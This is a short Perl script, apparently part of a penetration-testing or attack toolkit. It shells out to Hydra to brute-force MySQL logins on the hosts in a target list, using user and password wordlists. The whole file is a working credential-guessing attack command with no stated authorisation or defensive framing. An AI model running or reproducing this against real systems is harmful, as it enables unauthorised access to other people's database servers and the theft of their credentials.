#!/usr/bin/perl
use strict;
use warnings;

require("./scripts.pm");
our(@TARGET, @OUTFOLDER);

system("hydra -L wordlists/users.txt -P wordlists/passwords.txt @TARGET mysql -V")
